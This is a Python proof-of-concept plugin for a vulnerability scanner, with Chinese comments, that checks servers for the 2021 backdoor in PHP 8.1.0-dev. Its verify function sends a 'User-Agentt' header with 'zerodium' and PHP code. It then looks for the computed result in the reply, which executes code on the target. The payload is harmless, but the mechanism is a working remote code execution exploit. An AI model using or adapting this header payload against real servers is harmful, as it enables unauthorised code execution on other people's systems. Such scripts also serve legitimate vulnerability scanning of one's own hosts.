# coding:utf-8  
import requests
from lib.common import url_handle,get_random_ua
# ...
import urllib3
urllib3.disable_warnings()
_info = {
    "author" : "jijue",                      # POC作者
    "version" : "1",                    # POC版本，默认是1  
    "CreateDate" : "2021-06-07",        # POC创建时间
    "UpdateDate" : "2021-06-07",        # POC创建时间
    "PocDesc" : """
    略  
    """,                                # POC描述，写更新描述，没有就不写

    "name" : "php_v8开发版后门",                        # 漏洞名称
    "AppName" : "php",                     # 漏洞应用名称
    "AppVersion" : "PHP 8.1.0-dev 版本",                  # 漏洞应用版本
    "VulnDate" : "2021-03-28",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
    "VulnDesc" : """
    PHP 8.1.0-dev 版本于 2021 年 3 月 28 日被植入后门，但后门很快被发现并移除。当服务器上存在此后门时，攻击者可以通过发送User-Agentt标头来执行任意代码。
    """,                                # 漏洞简要描述

    "fofa-dork":"无",                     # fofa搜索语句
    "example" : "",                     # 存在漏洞的演示url，写一个就可以了
    "exp_img" : "",                      # 先不管  

    "timeout" : 5,                      # 超时设定
}

def verify(host,proxy):
    """
    返回vuln

    存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

    不存在漏洞：vuln = [False,""]
    """
    vuln = [False,""]
    url = url_handle(host) + "/" # url自己按需调整

    if proxy:
        proxies = {
        "http": "http://%s"%(proxy),
        "https": "http://%s"%(proxy),
        }
    headers = {"User-Agent":get_random_ua(),
                "User-Agentt":"zerodiumvar_dump(133*133);",
                "Connection":"close",
                # "Content-Type": "application/x-www-form-urlencoded",
                }
    
    try:
        """
        检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
        """
        req = requests.get(url,headers = headers , timeout = _info["timeout"],verify = False)
        if req.status_code == 200 and "int(17689)" in req.text:
            vuln = [True,req.text]
        else:
            vuln = [False,req.text]
    except Exception as e:
        raise e
    
    return vuln

